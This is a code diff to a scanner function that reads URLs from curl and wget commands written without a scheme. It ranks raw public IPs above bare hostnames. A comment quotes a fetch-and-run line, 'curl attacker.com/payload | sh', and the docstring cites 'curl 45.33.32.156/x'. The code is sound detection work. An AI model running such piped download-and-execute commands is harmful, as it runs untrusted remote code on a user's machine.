@@ -899,9 +899,11 @@ _WGET_RE = re.compile(r"(?i)(?<![\w./-])wget(?:\.exe)?(?![\w-])")
 def _bare_host_url(seg: str, after: int) -> Url | None:
     """The URL a fetch reaches when its host is written without a scheme.
 
-    curl and wget default to ``http://`` (``curl 45.33.32.156/x``).  Only the
-    first word that is not an option or an option's value is read, and only a
-    raw IP or a host with a path or port counts.
+    curl and wget default to ``http://`` (``curl 45.33.32.156/x``); that is
+    read as plaintext for a raw IP only.  A schemeless hostname gets an empty
+    scheme (LOW, not HIGH; GAPS.md).  Only the first word that is not an option
+    or an option's value is read, and only a raw IP or a host with a path or
+    port counts.
     """
     tokens = seg[after:].split()
     wget = bool(_WGET_RE.search(seg[:after]))
@@ -915,7 +917,13 @@ def _bare_host_url(seg: str, after: int) -> Url | None:
             skip = word in _FETCH_ARG_FLAGS or (wget and word in _WGET_ONLY_ARG_FLAGS)
             continue
         if _BARE_HOST_RE.match(word):
-            return parse_url("http://" + word)
+            url = parse_url("http://" + word)
+            if is_public_ip(url.host):
+                return url
+            # A hostname written without a scheme is prose far more often than
+            # an attack ("curl attacker.com/payload | sh" in a security
+            # reference), so it is not read as plaintext: scheme left empty.
+            return Url("", url.host, url.path)
         return None
     return None
 
